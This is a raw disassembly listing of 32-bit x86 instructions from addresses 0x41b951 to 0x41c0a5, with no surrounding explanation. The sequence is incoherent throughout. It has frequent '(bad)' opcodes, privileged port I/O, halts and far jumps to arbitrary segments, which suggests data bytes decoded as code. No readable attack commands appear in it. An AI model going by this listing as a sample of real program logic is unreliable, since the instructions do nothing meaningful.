  41b951:	cmp    eax,0x39e366d
  41b956:	and    dh,BYTE PTR [ecx+0x5d]
  41b959:	and    BYTE PTR [ebx+0x7],cl
  41b95c:	iret   
  41b95d:	jne    0x41b900
  41b95f:	push   ds
  41b960:	cwde   
  41b961:	push   edi
  41b962:	inc    ebp
  41b963:	and    al,0x91
  41b965:	out    0xe8,eax
  41b967:	fdiv   DWORD PTR [bx+si-0x53]
  41b96b:	adc    BYTE PTR gs:[ebx+0x2b],ch
  41b96f:	sar    ebp,1
  41b971:	sbb    ch,dh
  41b973:	cmp    ch,BYTE PTR [edx]
  41b975:	cld    
  41b976:	mov    al,ds:0xf7f660d9
  41b97b:	push   ecx
  41b97c:	repz cmp eax,0x9725bd2b
  41b982:	loop   0x41b91e
  41b984:	hlt    
  41b985:	test   ecx,ebx
  41b987:	in     eax,dx
  41b988:	fcomp  QWORD PTR [edx-0x24]
  41b98b:	mov    esp,0x34919d7a
  41b990:	nop
  41b991:	xor    al,0x35
  41b993:	mov    edx,0x4ebe1230
  41b998:	jne    0x41b9ec
  41b99a:	jo     0x41b927
  41b99c:	jbe    0x41b94f
  41b99e:	inc    esi
  41b99f:	adc    BYTE PTR [esi+eiz*2+0x6de1c51],bl
  41b9a6:	jne    0x41b96a
  41b9a8:	and    ah,BYTE PTR cs:[edx]
  41b9ab:	lods   eax,DWORD PTR ds:[esi]
  41b9ac:	lds    edx,FWORD PTR [esi]
  41b9ae:	(bad)  
  41b9b0:	cdq    
  41b9b1:	xor    eax,0x46cca520
  41b9b6:	cmp    al,0x7f
  41b9b8:	xchg   edx,eax
  41b9b9:	mov    ebx,0xf4743dc
  41b9be:	xchg   ecx,eax
  41b9bf:	pop    ebp
  41b9c0:	sar    BYTE PTR [edx+0x79],cl
  41b9c3:	pop    ebx
  41b9c4:	inc    edx
  41b9c5:	(bad)  
  41b9c6:	loopne 0x41b960
  41b9c8:	loope  0x41ba19
  41b9ca:	test   DWORD PTR [edi-0x6c],0x8799b808
  41b9d1:	jp     0x41ba3a
  41b9d3:	xor    DWORD PTR [edi+0x4bbfaa4],ecx
  41b9d9:	jb     0x41b9d4
  41b9db:	clc    
  41b9dc:	add    ah,al
  41b9de:	clc    
  41b9df:	xchg   esp,eax
  41b9e0:	add    BYTE PTR [edi+edx*8+0x3f57dbe8],bl
  41b9e7:	jne    0x41b9ca
  41b9e9:	xor    al,0xc2
  41b9eb:	aas    
  41b9ec:	or     eax,0x61f631d5
  41b9f1:	pop    eax
  41b9f2:	lods   eax,DWORD PTR ds:[esi]
  41b9f3:	hlt    
  41b9f4:	xor    eax,0x8f92836d
  41b9f9:	xchg   esi,eax
  41b9fa:	jno    0x41ba02
  41b9fc:	adc    edx,edi
  41b9fe:	mov    BYTE PTR [edx+0x21bc2d8e],al
  41ba04:	mov    BYTE PTR [edi-0x21c7e491],cl
  41ba0a:	mov    cl,0x83
  41ba0c:	cld    
  41ba0d:	mov    eax,0x7814a43d
  41ba12:	aam    0xd0
  41ba14:	call   0x5a4b6000
  41ba19:	xchg   ebp,eax
  41ba1a:	test   BYTE PTR [edi],dh
  41ba1c:	mov    ebx,ebx
  41ba1e:	(bad)  
  41ba1f:	mov    ds:0xc587cf24,al
  41ba24:	out    dx,eax
  41ba25:	mov    bh,BYTE PTR [esi+0x52b17009]
  41ba2b:	(bad)  
  41ba2d:	enter  0xed96,0x90
  41ba31:	out    dx,eax
  41ba32:	stc    
  41ba33:	stc    
  41ba34:	in     al,0x3a
  41ba36:	fsin   
  41ba38:	test   BYTE PTR [ebx+0x7b5f56f7],dh
  41ba3e:	outs   dx,DWORD PTR ds:[esi]
  41ba3f:	scas   al,BYTE PTR es:[edi]
  41ba40:	push   0xffffffd2
  41ba42:	pop    ss
  41ba43:	aam    0xa
  41ba45:	pop    esi
  41ba46:	(bad)  fs:[esp+ebx*4+0x6]
  41ba4b:	pop    edx
  41ba4c:	sbb    eax,0xa0736f88
  41ba51:	adc    BYTE PTR [ecx-0x218ec578],bh
  41ba57:	lock fcom DWORD PTR [ebp+0x6288816f]
  41ba5e:	in     al,dx
  41ba5f:	fdivr  QWORD PTR [eax+0x7b]
  41ba62:	out    0xdb,al
  41ba64:	jl     0x41b9e6
  41ba66:	push   edi
  41ba67:	and    ecx,esp
  41ba69:	mov    al,bh
  41ba6b:	call   0x7aa701ed
  41ba70:	add    ecx,DWORD PTR [ecx+0x3e]
  41ba73:	jmp    FWORD PTR [edx-0x8030e21]
  41ba79:	data16 stc 
  41ba7b:	dec    DWORD PTR [edi+0x38d50886]
  41ba81:	das    
  41ba82:	mov    ebx,0x36098274
  41ba87:	mov    ecx,0x3597e03a
  41ba8c:	pop    edi
  41ba8d:	xchg   ebp,eax
  41ba8e:	fisub  WORD PTR [eax-0xb79fbdc]
  41ba94:	in     eax,dx
  41ba95:	(bad)  [esi-0x394a1f7e]
  41ba9b:	(bad)  
  41ba9c:	inc    ebp
  41ba9d:	sub    eax,0xfe138d6c
  41baa2:	jnp    0x41ba52
  41baa4:	mov    ecx,0x5d2df972
  41baa9:	jno    0x41baac
  41baab:	in     eax,dx
  41baac:	adc    dh,BYTE PTR [esi]
  41baae:	push   eax
  41baaf:	lock sub ch,BYTE PTR [ecx]
  41bab2:	sti    
  41bab3:	sub    BYTE PTR [ecx-0x21],dl
  41bab6:	jb     0x41ba50
  41bab8:	inc    esp
  41bab9:	sbb    BYTE PTR [ebp-0x491ea343],0x3
  41bac0:	mov    esi,0x89181654
  41bac5:	pop    edx
  41bac6:	xchg   BYTE PTR [edi-0x44],dl
  41bac9:	rcr    eax,cl
  41bacb:	cdq    
  41bacc:	mov    dl,0x8b
  41bace:	mov    dl,0xde
  41bad0:	jp     0x41babf
  41bad2:	xor    al,0xb2
  41bad4:	xchg   ebp,eax
  41bad5:	das    
  41bad6:	inc    esi
  41bad7:	scas   al,BYTE PTR es:[edi]
  41bad8:	stc    
  41bad9:	adc    esi,ebp
  41badb:	mov    esp,0x7da60e3f
  41bae0:	or     ebp,DWORD PTR [eax+0x5802b060]
  41bae6:	bswap  edx
  41bae8:	outs   dx,DWORD PTR ds:[esi]
  41bae9:	pop    ebx
  41baea:	lds    esp,FWORD PTR [eax]
  41baec:	xchg   edi,eax
  41baed:	out    dx,al
  41baee:	inc    esi
  41baef:	adc    BYTE PTR [eax-0x5c],dh
  41baf2:	nop
  41baf3:	mov    ebp,0x334440c0
  41baf8:	(bad)  
  41baf9:	lea    ebp,[esi-0x48be34f2]
  41baff:	add    DWORD PTR [ecx-0x3a],eax
  41bb02:	imul   ebx,DWORD PTR [edx-0x4810bb12],0x4
  41bb09:	fidiv  WORD PTR [edi+0x442422cf]
  41bb0f:	mov    BYTE PTR [ecx+0x4b],cl
  41bb12:	sub    BYTE PTR [eax],dl
  41bb14:	lods   al,BYTE PTR ds:[esi]
  41bb15:	icebp  
  41bb16:	mov    DWORD PTR [ebx],esi
  41bb18:	or     BYTE PTR ds:0xe5a021ec,bl
  41bb1e:	mov    BYTE PTR [edi+0x43],dl
  41bb21:	fadd   st(2),st
  41bb23:	inc    edx
  41bb24:	out    0x14,eax
  41bb26:	ror    BYTE PTR [edx],0xec
  41bb29:	jb     0x41bb19
  41bb2b:	fisub  DWORD PTR [eax+0xc]
  41bb2e:	mov    eax,esp
  41bb30:	xchg   edx,eax
  41bb31:	mov    WORD PTR ds:0x94d293,?
  41bb37:	xor    al,0xd
  41bb39:	loop   0x41bb4d
  41bb3b:	mov    dh,0x4a
  41bb3d:	std    
  41bb3e:	sub    dl,BYTE PTR [esi+0x69]
  41bb41:	(bad)  
  41bb43:	and    bl,BYTE PTR [edi-0xa]
  41bb46:	pop    edi
  41bb47:	push   esp
  41bb48:	inc    ebx
  41bb49:	aas    
  41bb4a:	inc    ebp
  41bb4b:	mov    cl,0xe2
  41bb4d:	out    dx,eax
  41bb4e:	mov    dl,0x31
  41bb50:	loopne 0x41bb55
  41bb52:	cld    
  41bb53:	scas   eax,DWORD PTR es:[edi]
  41bb54:	psrad  mm1,mm3
  41bb57:	mov    eax,ds:0x67fab4b7
  41bb5c:	int    0x75
  41bb5e:	mov    ebx,0xb562ae93
  41bb63:	dec    esp
  41bb64:	test   eax,0x162848d4
  41bb69:	fcomp  DWORD PTR [edx-0x51]
  41bb6c:	inc    esi
  41bb6d:	cmp    eax,0x86536aad
  41bb72:	lock popa 
  41bb74:	shl    DWORD PTR [ebp-0x2c],1
  41bb77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb78:	xchg   esp,eax
  41bb79:	xlat   BYTE PTR ds:[ebx]
  41bb7a:	into   
  41bb7b:	mov    ds:0x2eb1f4d0,eax
  41bb80:	aas    
  41bb81:	mov    esp,0x19411fda
  41bb86:	dec    edx
  41bb87:	cwde   
  41bb88:	pop    es
  41bb89:	xor    al,0x69
  41bb8b:	es (bad) 
  41bb8d:	bndstx gs:[eax],(bad)
  41bb91:	and    DWORD PTR [ebp+0x6],esi
  41bb94:	cmp    al,BYTE PTR [ecx-0x1e3c0eae]
  41bb9a:	aaa    
  41bb9b:	sub    eax,0x79b00bf3
  41bba0:	adc    bh,BYTE PTR [eax]
  41bba2:	lds    edi,FWORD PTR [ebx+edx*2-0x7f4cf25b]
  41bba9:	sbb    eax,0x237f4a1f
  41bbae:	das    
  41bbaf:	sbb    al,0xd8
  41bbb1:	pushf  
  41bbb2:	or     BYTE PTR [esi+0x65dcf241],dh
  41bbb8:	sub    DWORD PTR [esi+edi*1+0x57254e97],esp
  41bbbf:	pop    ebp
  41bbc0:	sub    eax,0x791e59cb
  41bbc5:	les    ecx,FWORD PTR [ecx-0x2c]
  41bbc8:	or     al,0xd9
  41bbca:	pushf  
  41bbcb:	pop    ss
  41bbcc:	push   ebx
  41bbcd:	add    al,0xa2
  41bbcf:	jp     0x41bc4b
  41bbd1:	push   edx
  41bbd2:	or     al,BYTE PTR [edx-0x5d]
  41bbd5:	cdq    
  41bbd6:	adc    bl,BYTE PTR [eax+ebp*4]
  41bbd9:	bound  eax,QWORD PTR [ebx+ecx*1-0x6f]
  41bbdd:	pop    ds
  41bbde:	pop    eax
  41bbdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbe0:	ja     0x41bb69
  41bbe2:	dec    edi
  41bbe3:	jge    0x41bbd5
  41bbe5:	xchg   esp,eax
  41bbe6:	out    dx,eax
  41bbe7:	outs   dx,BYTE PTR ds:[esi]
  41bbe8:	pop    es
  41bbe9:	imul   DWORD PTR ds:0xfdd48001
  41bbef:	and    eax,DWORD PTR [eax-0x7de94e15]
  41bbf5:	inc    eax
  41bbf6:	mov    edx,esp
  41bbf8:	stc    
  41bbf9:	push   edx
  41bbfa:	xchg   ecx,eax
  41bbfb:	sub    eax,0xba37b640
  41bc00:	mov    cx,0xe216
  41bc04:	jne    0x41bc21
  41bc06:	push   edi
  41bc07:	jbe    0x41bbb3
  41bc09:	xor    cl,BYTE PTR [esp+esi*1]
  41bc0c:	pop    edx
  41bc0d:	adc    eax,0x6a537b45
  41bc12:	push   es
  41bc13:	push   ds
  41bc14:	lods   eax,DWORD PTR ds:[esi]
  41bc15:	push   ds
  41bc16:	push   0xf89ea319
  41bc1b:	out    dx,eax
  41bc1c:	push   ss
  41bc1d:	(bad)  
  41bc1f:	aam    0xb1
  41bc21:	push   edx
  41bc22:	sbb    esp,DWORD PTR [esi]
  41bc24:	jg     0x41bbf3
  41bc26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc27:	jno    0x41bc0a
  41bc29:	in     al,0x25
  41bc2b:	ja     0x41bc17
  41bc2d:	mov    bh,0x4d
  41bc2f:	ret    0x7321
  41bc32:	ss jge 0x41bc49
  41bc35:	test   DWORD PTR [esi-0x7a],0x676ebc4
  41bc3c:	or     ebx,DWORD PTR [esi]
  41bc3e:	imul   BYTE PTR [edi+0x996115c]
  41bc44:	push   esp
  41bc45:	xor    eax,0x416bdf99
  41bc4a:	inc    ebx
  41bc4b:	shl    DWORD PTR [ecx+0x56f15212],1
  41bc51:	test   DWORD PTR [edx],esi
  41bc53:	pop    ss
  41bc54:	in     al,dx
  41bc55:	maskmovq mm5,(bad)
  41bc56:	imul   DWORD PTR [esi-0x6a]
  41bc59:	cmp    bl,BYTE PTR [ebx]
  41bc5b:	add    al,0x70
  41bc5d:	add    al,0xfe
  41bc5f:	dec    ebp
  41bc60:	cmp    DWORD PTR [edi-0xd59b616],0xf6818e2f
  41bc6a:	mov    DWORD PTR [ebx-0x6a],edx
  41bc6d:	jl     0x41bc22
  41bc6f:	jp     0x41bca3
  41bc71:	sbb    esp,ebx
  41bc73:	sar    DWORD PTR [eax+0x3ef5d372],cl
  41bc79:	retf   0x591e
  41bc7c:	add    eax,0x3a81f57c
  41bc81:	xor    al,0x9f
  41bc83:	js     0x41bc7f
  41bc85:	xchg   DWORD PTR [edx+0x6a83d886],ecx
  41bc8b:	sub    ch,BYTE PTR [eax-0x1ad7bd93]
  41bc91:	adc    esi,DWORD PTR [eax-0x7c82d713]
  41bc97:	fmul   st,st(7)
  41bc99:	pop    esi
  41bc9a:	inc    edx
  41bc9b:	jl     0x41bc60
  41bc9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc9e:	das    
  41bc9f:	jo     0x41bc92
  41bca1:	shl    BYTE PTR [ebx],cl
  41bca3:	sub    al,0xff
  41bca5:	jmp    0x41bc3c
  41bca7:	mov    edi,0xcee6adc1
  41bcac:	shl    BYTE PTR [eax+eax*1+0x37],1
  41bcb0:	mov    ecx,0x5be5db9d
  41bcb5:	clc    
  41bcb6:	ins    DWORD PTR es:[edi],dx
  41bcb7:	test   DWORD PTR [ecx-0x6a],esp
  41bcba:	xchg   DWORD PTR [edx],esi
  41bcbc:	int3   
  41bcbd:	xchg   BYTE PTR [edi-0x51],ah
  41bcc0:	and    edi,ecx
  41bcc2:	das    
  41bcc3:	inc    esp
  41bcc4:	push   ebp
  41bcc5:	dec    esi
  41bcc6:	ds mov al,0x26
  41bcc9:	mov    ds:0x6a4b8fd2,eax
  41bcce:	fcmovnu st,st(2)
  41bcd0:	xchg   ebp,eax
  41bcd1:	and    ebx,DWORD PTR [ebp-0x28adcb9b]
  41bcd7:	popf   
  41bcd8:	mov    ebp,0x69f76798
  41bcdd:	jmp    0x1ad5:0xd43cadf6
  41bce4:	ror    DWORD PTR [edi],1
  41bce6:	adc    BYTE PTR [ecx],bh
  41bce8:	call   0xd783:0x24f4b6b7
  41bcef:	fcomp  QWORD PTR [ecx]
  41bcf1:	push   edx
  41bcf2:	scas   eax,DWORD PTR es:[edi]
  41bcf3:	xor    DWORD PTR [edi-0x4f],eax
  41bcf6:	jl     0x41bc9e
  41bcf8:	mov    edx,0xa64c9b3e
  41bcfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bcfe:	sbb    ch,al
  41bd00:	popa   
  41bd01:	js     0x41bd75
  41bd03:	cmp    eax,0xca3d718f
  41bd08:	lahf   
  41bd09:	push   edi
  41bd0a:	iret   
  41bd0b:	jns    0x41bd7d
  41bd0d:	fstp   TBYTE PTR [eax]
  41bd0f:	dec    ecx
  41bd10:	jg     0x41bcee
  41bd12:	ja     0x41bd22
  41bd14:	ins    DWORD PTR es:[edi],dx
  41bd15:	cmc    
  41bd16:	std    
  41bd17:	aas    
  41bd18:	not    DWORD PTR ds:0x2b5e0c21
  41bd1e:	mov    edx,0xc9c64359
  41bd23:	cmp    esp,esi
  41bd25:	(bad)  
  41bd26:	(bad)  
  41bd27:	cwde   
  41bd28:	repnz mov al,0xd3
  41bd2b:	mov    al,BYTE PTR [ebx+0x16]
  41bd2e:	aam    0xc0
  41bd30:	xchg   ecx,eax
  41bd31:	dec    edx
  41bd32:	sbb    BYTE PTR [eax],al
  41bd34:	pop    ss
  41bd35:	test   DWORD PTR [eax+0x2d],ebx
  41bd38:	daa    
  41bd39:	pop    ebp
  41bd3a:	push   cs
  41bd3b:	lods   al,BYTE PTR ds:[esi]
  41bd3c:	mov    cx,0x344c
  41bd40:	add    edx,DWORD PTR [esi+0x5687ea61]
  41bd46:	mov    eax,ds:0xac5bef49
  41bd4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd4c:	sub    BYTE PTR [esi],0xd7
  41bd4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd50:	jmp    0x41bdb6
  41bd52:	add    ebx,ebx
  41bd54:	stc    
  41bd55:	and    al,BYTE PTR [ebx+0x37c635c7]
  41bd5b:	in     al,dx
  41bd5c:	jbe    0x41bd44
  41bd5e:	sti    
  41bd5f:	inc    ebp
  41bd60:	xor    eax,0xe696ae24
  41bd65:	or     edi,esi
  41bd67:	ins    DWORD PTR es:[edi],dx
  41bd68:	xor    dl,dl
  41bd6a:	inc    eax
  41bd6b:	xchg   BYTE PTR [ebp+0x6e8d8233],ch
  41bd71:	jbe    0x41bd28
  41bd73:	lods   eax,DWORD PTR ds:[esi]
  41bd74:	sahf   
  41bd75:	rol    DWORD PTR ds:0xa2ffe41e,cl
  41bd7b:	xor    al,0x3f
  41bd7d:	cmp    ah,BYTE PTR [edi+ebp*8]
  41bd80:	add    eax,0x70204d6
  41bd85:	sub    bh,BYTE PTR [ebx]
  41bd87:	loope  0x41bd9e
  41bd89:	call   0x6e0e:0x7ba8705a
  41bd90:	pop    edx
  41bd91:	cmp    esi,ebp
  41bd93:	mov    gs,ecx
  41bd95:	fs dec eax
  41bd97:	hlt    
  41bd98:	adc    BYTE PTR [esi],bh
  41bd9a:	loopne 0x41bd1d
  41bd9c:	and    DWORD PTR [esi-0x6b],ebx
  41bd9f:	xor    BYTE PTR [esi+eiz*1+0x577412f2],dh
  41bda6:	ins    BYTE PTR es:[edi],dx
  41bda7:	fcomi  st,st(5)
  41bda9:	outs   dx,BYTE PTR ds:[esi]
  41bdaa:	push   ebx
  41bdab:	push   ss
  41bdac:	hlt    
  41bdad:	ds ret 0x5c60
  41bdb1:	sbb    BYTE PTR [ebx+0x160e6577],ch
  41bdb7:	pop    ecx
  41bdb8:	neg    esp
  41bdba:	pop    ss
  41bdbb:	lea    esi,[ecx-0x1]
  41bdbe:	and    cl,BYTE PTR [esi]
  41bdc0:	in     al,0x2e
  41bdc2:	jmp    0x30a4:0xbae61782
  41bdc9:	in     eax,0x6a
  41bdcb:	test   DWORD PTR [ecx],ecx
  41bdcd:	cs jge 0x41be08
  41bdd0:	(bad)  
  41bdd1:	cmp    ecx,ebp
  41bdd3:	inc    ecx
  41bdd4:	xlat   BYTE PTR ds:[ebx]
  41bdd5:	xor    al,0x20
  41bdd7:	inc    edx
  41bdd8:	push   edx
  41bdd9:	aas    
  41bdda:	cmc    
  41bddb:	popf   
  41bddc:	dec    edx
  41bddd:	repnz popf 
  41bddf:	pop    ecx
  41bde0:	(bad)  
  41bde1:	xor    eax,DWORD PTR [edx+0x4f]
  41bde4:	mov    ah,0x68
  41bde6:	cmp    eax,0xbc969b1c
  41bdeb:	mov    ch,0xd7
  41bded:	ds jo  0x41be49
  41bdf0:	push   edx
  41bdf1:	push   edi
  41bdf2:	inc    esi
  41bdf3:	stc    
  41bdf4:	leave  
  41bdf5:	dec    ebp
  41bdf6:	jnp    0x41be02
  41bdf8:	enter  0xe157,0xf8
  41bdfc:	and    bh,dh
  41bdfe:	(bad)  
  41bdff:	std    
  41be00:	stos   DWORD PTR es:[edi],eax
  41be01:	not    BYTE PTR [edx]
  41be03:	pop    edi
  41be04:	test   eax,0xb8f2a039
  41be0a:	sbb    al,0x2b
  41be0c:	arpl   WORD PTR [ebx-0xef09dc5],bp
  41be12:	xchg   esp,eax
  41be13:	mov    bl,bh
  41be15:	(bad)  
  41be16:	jne    0x41bdff
  41be18:	inc    ebp
  41be19:	cmp    DWORD PTR [eax-0x4c],eax
  41be1c:	mov    ds:0xe47a0041,eax
  41be21:	inc    eax
  41be22:	mov    ebp,0x8e9123c0
  41be27:	test   BYTE PTR [edx+ebx*4+0x5a0ee0e7],al
  41be2e:	add    eax,DWORD PTR [edx]
  41be30:	sub    BYTE PTR [ebx+0x45],dl
  41be33:	pop    edx
  41be34:	jp     0x41bdb8
  41be36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be37:	mov    ds:0x34822112,al
  41be3c:	xchg   ebx,eax
  41be3d:	out    dx,eax
  41be3e:	stos   BYTE PTR es:[edi],al
  41be3f:	(bad)  
  41be40:	fwait
  41be41:	sub    ch,BYTE PTR [ebp-0x61ec1a0]
  41be47:	cwde   
  41be48:	add    esi,DWORD PTR [edi+0x79dba158]
  41be4e:	pop    ebp
  41be4f:	shr    BYTE PTR [esi-0x24d90c1b],0xe1
  41be56:	sub    eax,0x3234a7a2
  41be5b:	cmp    al,0xf5
  41be5d:	push   eax
  41be5e:	sub    bh,bl
  41be60:	out    dx,al
  41be61:	push   ss
  41be62:	outs   dx,DWORD PTR ds:[esi]
  41be63:	mov    esi,0xaf4729f9
  41be68:	mov    dh,0xe2
  41be6a:	mov    cs,WORD PTR [ebp-0x6afa8da5]
  41be70:	push   es
  41be71:	push   edi
  41be72:	ds clc 
  41be74:	pop    esp
  41be75:	loope  0x41be32
  41be77:	js     0x41be8e
  41be79:	lods   eax,DWORD PTR ds:[esi]
  41be7a:	data16 sbb ch,BYTE PTR [edi+0x578bef4b]
  41be81:	add    BYTE PTR [ebp-0x61],bh
  41be84:	mov    esi,0x519e362d
  41be89:	into   
  41be8a:	jns    0x41be3a
  41be8c:	ja     0x41bef7
  41be8e:	inc    esi
  41be8f:	lock push esp
  41be91:	test   eax,0xf1590eb1
  41be96:	xchg   ecx,eax
  41be97:	jo     0x41be8d
  41be99:	mov    al,ds:0x844b6a61
  41be9e:	fstp   TBYTE PTR [eax+0x1d]
  41bea1:	jge    0x41bef0
  41bea3:	push   esp
  41bea4:	sbb    bl,BYTE PTR [eax-0x52]
  41bea7:	imul   esp,ebx,0x3a
  41beaa:	jmp    0x41bf0e
  41beac:	lock ja 0x41be4f
  41beaf:	sbb    BYTE PTR [ecx-0x32],bl
  41beb2:	js     0x41bec8
  41beb4:	fiadd  WORD PTR [ebx-0x11]
  41beb7:	sar    DWORD PTR [esi],0xe8
  41beba:	push   esi
  41bebb:	and    BYTE PTR [ebx],bl
  41bebd:	add    al,0xd6
  41bebf:	jmp    0x41beb8
  41bec1:	adc    eax,ebp
  41bec3:	sbb    BYTE PTR ds:0x9e9947c4,bh
  41bec9:	adc    ebx,DWORD PTR [eax-0x4dfa8570]
  41becf:	pop    edx
  41bed0:	adc    ebx,ebx
  41bed2:	cmc    
  41bed3:	push   esp
  41bed4:	not    DWORD PTR [edi+0x7]
  41bed7:	je     0x41beec
  41bed9:	rcl    DWORD PTR [edi],cl
  41bedb:	outs   dx,BYTE PTR ds:[esi]
  41bedc:	or     ebx,DWORD PTR [edi]
  41bede:	repz sub esi,DWORD PTR [ecx-0x5ce3a7ab]
  41bee5:	push   esi
  41bee6:	(bad)  
  41bee7:	popf   
  41bee8:	inc    ebx
  41bee9:	inc    ebx
  41beea:	jmp    0x88d4:0x98ce6c0f
  41bef1:	mov    dh,0xed
  41bef3:	fcom   DWORD PTR [ecx+0x5c53ebd6]
  41bef9:	or     edi,esp
  41befb:	mov    eax,ds:0x4d975ca
  41bf00:	sar    BYTE PTR [eax-0x31d671b6],0xa2
  41bf07:	pop    eax
  41bf08:	ins    BYTE PTR es:[edi],dx
  41bf09:	(bad)  
  41bf0a:	adc    BYTE PTR [ebp-0x5],ah
  41bf0d:	pushf  
  41bf0e:	stos   BYTE PTR es:[edi],al
  41bf0f:	adc    BYTE PTR [eax+0x5c2021e],ah
  41bf15:	jp     0x41bee2
  41bf17:	imul   BYTE PTR ds:0xb32ab032
  41bf1d:	jae    0x41bf2a
  41bf1f:	inc    edx
  41bf20:	sahf   
  41bf21:	xchg   cx,ax
  41bf23:	sbb    DWORD PTR [ebp+0x4b],ecx
  41bf26:	scas   eax,DWORD PTR es:[edi]
  41bf27:	popa   
  41bf28:	or     ah,BYTE PTR [ebx+0x3cf5c882]
  41bf2e:	inc    edx
  41bf2f:	adc    al,0xf9
  41bf31:	shl    DWORD PTR [ecx+eax*1-0x4b006f28],1
  41bf38:	std    
  41bf39:	pop    esp
  41bf3a:	push   esi
  41bf3b:	aas    
  41bf3c:	and    esp,DWORD PTR [edx+0x7e]
  41bf3f:	fwait
  41bf40:	jg     0x41bf38
  41bf42:	out    dx,eax
  41bf43:	es gs stos BYTE PTR es:[edi],al
  41bf46:	push   0x2b
  41bf48:	je     0x41bf1d
  41bf4a:	or     ecx,edi
  41bf4c:	push   ebx
  41bf4d:	aam    0xde
  41bf4f:	and    eax,0x44ca62ca
  41bf54:	jge    0x41bf47
  41bf56:	xchg   esi,eax
  41bf57:	repz mov edx,0x2c6a531e
  41bf5d:	std    
  41bf5e:	and    BYTE PTR [ebx-0x49],0xbf
  41bf62:	add    BYTE PTR [eax-0x63a6e88b],0x63
  41bf69:	leave  
  41bf6a:	jmp    0xd352:0x9e21916d
  41bf71:	loope  0x41bfa1
  41bf73:	scas   al,BYTE PTR es:[edi]
  41bf74:	inc    ebx
  41bf75:	sahf   
  41bf76:	and    bh,dl
  41bf78:	fs loope 0x41bf02
  41bf7b:	pop    esp
  41bf7c:	push   esp
  41bf7d:	or     DWORD PTR [edi+0x171cf10c],ebp
  41bf83:	fisubr DWORD PTR [ebp+0xe17bb60]
  41bf89:	jmp    0x41bfe1
  41bf8b:	mov    eax,ds:0x76061df1
  41bf90:	xchg   edx,eax
  41bf91:	sub    al,0xbc
  41bf93:	pusha  
  41bf94:	mov    ch,0x95
  41bf96:	jnp    0x41bf8c
  41bf98:	push   cs
  41bf99:	fidiv  WORD PTR [edi-0x3a6c2907]
  41bf9f:	pop    edx
  41bfa0:	mov    BYTE PTR [edx],ah
  41bfa2:	lods   eax,DWORD PTR ds:[esi]
  41bfa3:	jmp    0x5764d6b3
  41bfa8:	cmp    BYTE PTR [ebx+0x50],bh
  41bfab:	sub    al,0xba
  41bfad:	repnz inc ecx
  41bfaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bfb0:	xor    al,0xe7
  41bfb2:	mov    eax,0x24096bda
  41bfb7:	shl    BYTE PTR ds:0x73543aac,1
  41bfbd:	jbe    0x41bff1
  41bfbf:	push   ss
  41bfc0:	and    al,0xe8
  41bfc2:	pop    ebx
  41bfc3:	add    al,BYTE PTR [ecx+0x5e]
  41bfc6:	in     eax,0x6f
  41bfc8:	pushf  
  41bfc9:	mov    eax,ds:0x53b803d
  41bfce:	sahf   
  41bfcf:	jo     0x41bf80
  41bfd1:	cmp    eax,0x783cb8c5
  41bfd6:	mul    BYTE PTR [ebx-0x20ad9572]
  41bfdc:	pop    es
  41bfdd:	fcmovnu st,st(5)
  41bfdf:	into   
  41bfe0:	and    eax,0xcfc73588
  41bfe5:	mov    bl,dh
  41bfe7:	mov    edi,0x719b7ec4
  41bfec:	arpl   WORD PTR [edx+0x12],si
  41bfef:	fimul  DWORD PTR [eax-0x47]
  41bff2:	fld    QWORD PTR [ebp-0x1eda328d]
  41bff8:	mov    al,BYTE PTR [eax+edi*8+0x67252fb4]
  41bfff:	ret    0x8cc1
  41c002:	add    DWORD PTR [esi],esi
  41c004:	adc    al,BYTE PTR ds:0x199bd818
  41c00a:	or     BYTE PTR [ebx],dl
  41c00c:	jl     0x41bffd
  41c00e:	shl    dl,cl
  41c010:	out    0xf5,eax
  41c012:	push   ds
  41c013:	inc    esi
  41c014:	shr    BYTE PTR [ebx+0x4d],0x11
  41c018:	mov    ds:0xe3b505b8,eax
  41c01e:	sar    BYTE PTR [ecx+0x4],0xbf
  41c022:	jle    0x41c022
  41c024:	hlt    
  41c025:	cmp    eax,DWORD PTR [ecx-0x6bf90057]
  41c02b:	mov    eax,ds:0x944a880a
  41c030:	int3   
  41c031:	push   esp
  41c032:	test   BYTE PTR [esi],0xcc
  41c035:	in     eax,0xb9
  41c037:	mov    bh,BYTE PTR [ebp-0x13]
  41c03a:	mov    edx,ecx
  41c03c:	loop   0x41bfff
  41c03e:	mov    ch,0x7d
  41c040:	int3   
  41c041:	dec    esi
  41c042:	out    0xca,al
  41c044:	popf   
  41c045:	lahf   
  41c046:	xor    dl,BYTE PTR [esi+0x54]
  41c049:	bound  eax,QWORD PTR [edx+ecx*4+0x4408b852]
  41c050:	pusha  
  41c051:	lea    ebx,[esi]
  41c053:	scas   al,BYTE PTR es:[edi]
  41c054:	push   ecx
  41c055:	add    eax,0xd5fd5bef
  41c05a:	mov    ds:0xb7a3e63e,al
  41c05f:	in     eax,dx
  41c060:	or     eax,0xcb676642
  41c065:	xlat   BYTE PTR ds:[ebx]
  41c066:	mov    dl,0xed
  41c068:	(bad)  
  41c06a:	push   cs
  41c06b:	daa    
  41c06c:	(bad)  
  41c06d:	sar    BYTE PTR [edi-0x46],cl
  41c070:	(bad)  
  41c071:	sbb    al,0x33
  41c073:	inc    ebp
  41c074:	jecxz  0x41c037
  41c076:	leave  
  41c077:	out    dx,eax
  41c078:	int    0x35
  41c07a:	jns    0x41c04b
  41c07c:	mov    bl,0x42
  41c07e:	inc    edi
  41c07f:	test   bh,bh
  41c081:	or     eax,0x7685719c
  41c086:	retf   0x33e6
  41c089:	fbstp  TBYTE PTR [ecx]
  41c08b:	inc    eax
  41c08c:	je     0x41c069
  41c08e:	inc    edx
  41c08f:	out    dx,eax
  41c090:	adc    eax,0x286c6a80
  41c095:	test   BYTE PTR [esi+0x610345e0],dl
  41c09b:	push   ebx
  41c09c:	in     eax,0x90
  41c09e:	shr    ecx,0x3
  41c0a1:	or     al,0x7a
  41c0a3:	aad    0x1d
  41c0a5:	jne    0x41c078
